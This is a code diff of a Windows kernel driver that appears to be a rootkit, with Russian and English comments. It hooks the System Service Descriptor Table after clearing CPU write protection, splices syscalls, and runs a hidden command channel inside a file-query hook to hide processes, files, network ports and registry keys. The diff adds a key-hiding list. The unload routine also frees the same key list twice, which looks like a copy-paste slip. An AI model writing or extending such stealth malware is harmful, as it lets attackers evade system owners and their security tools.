@@ -82,8 +82,6 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
 #endif
 
     glRealNtQueryInformationFile = (NT_QUERY_INFORMATION_FILE)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_INFORMATION_FILE];
-    //glRealNtQuerySystemInformation = (NT_QUERY_SYSTEM_INFORMATION)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION];
-    //glRealNtQueryDirectoryFile = (NT_QUERY_DIRECTORY_FILE)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE];
     glRealNtEnumerateKey = (NT_ENUMERATE_KEY)KeServiceDescriptorTable->Base[NUMBER_NT_ENUMERATE_KEY];
 
 
@@ -96,8 +94,6 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
 
     reg = ClearWP();
     KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_INFORMATION_FILE] = (ULONG)HookNtQueryInformationFile;
-    //KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)HookNtQuerySystemInformation;
-    //KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE] = (ULONG)HookNtQueryDirectoryFile;
     KeServiceDescriptorTable->Base[NUMBER_NT_ENUMERATE_KEY] = (ULONG)HookNtEnumerateKey;
     WriteCR0(reg);
 
@@ -112,7 +108,6 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
         0
     );
 
-    DbgPrint("addressForJmpNtQuerySystemInformation: %d\n", (ULONG)addressForJmpNtQuerySystemInformation);
 
     // Init task list for hide file
     addressForJmpNtNtQueryDirectoryFile = SplicingSyscall(
@@ -144,6 +139,12 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
     InitializeListHead(&glTaskQueueNet);
     //
 
+    // Init task list for hide key Создание резервного списка
+    // для выравнивания выделяемой памяти
+    ExInitializePagedLookasideList(&glPagedHideLastKey, NULL, NULL, 0, sizeof(HIDE_LAST_KEY), ' LFO', 0);
+    InitializeListHead(&glHideLastKey);
+    //
+
     //Hook keyboard
     /*status = InitHookKeyboard(dob);
     if (!NT_SUCCESS(status)) {
@@ -166,8 +167,6 @@ VOID DriverUnload(IN PDRIVER_OBJECT dob) {
 
     reg = ClearWP();
     KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_INFORMATION_FILE] = (ULONG)glRealNtQueryInformationFile;
-    //KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)glRealNtQuerySystemInformation;
-    //KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE] = (ULONG)glRealNtQueryDirectoryFile;
     KeServiceDescriptorTable->Base[NUMBER_NT_ENUMERATE_KEY] = (ULONG)glRealNtEnumerateKey;
     WriteCR0(reg);
 
@@ -198,6 +197,11 @@ VOID DriverUnload(IN PDRIVER_OBJECT dob) {
     //free list for add key
     FreeTaskQueueKeyList();
     ExDeletePagedLookasideList(&glPagedTaskQueueKey);
+    //
+
+    //free list for add key
+    FreeTaskQueueKeyList();
+    ExDeletePagedLookasideList(&glPagedHideLastKey);
     //
 
     //free list for net
@@ -240,7 +244,6 @@ ULONG_PTR HookNtQueryInformationFile(
         }
         else if (pCmd->flags & COMMAND_ADD_NEW_PROCESS) {
             if (pCmd->target != NULL && pCmd->change != NULL) {
-                //DbgPrint("New process PID: %d Name: %s\n", (ULONG)pCmd->target, (PCHAR)pCmd->change);
                 TaskQueueNewProc((ULONG)pCmd->target, (PCHAR)pCmd->change);
             }
         }
@@ -252,12 +255,9 @@ ULONG_PTR HookNtQueryInformationFile(
 
             }
         }
-        else if (pCmd->flags & COMMAND_RENAME_KEY) {
-            if (pCmd->flags & COMMAND_BUFFER_POINTER && pCmd->target != NULL && pCmd->change != NULL) {
-
-                DbgPrint("For key:%s add key:%s\n", (PCHAR)pCmd->target, (PCHAR)pCmd->change);
-                TaskQueueByKey((PCHAR)pCmd->target, (PCHAR)pCmd->change);
-
+        else if (pCmd->flags & COMMAND_HIDE_KEY) {
+            if (pCmd->flags & COMMAND_BUFFER_POINTER && pCmd->target != NULL) {
+                TaskQueueByKey((PCHAR)pCmd->target);
             }
         }
         else if (pCmd->flags & COMMAND_CHANGE_PORT) {
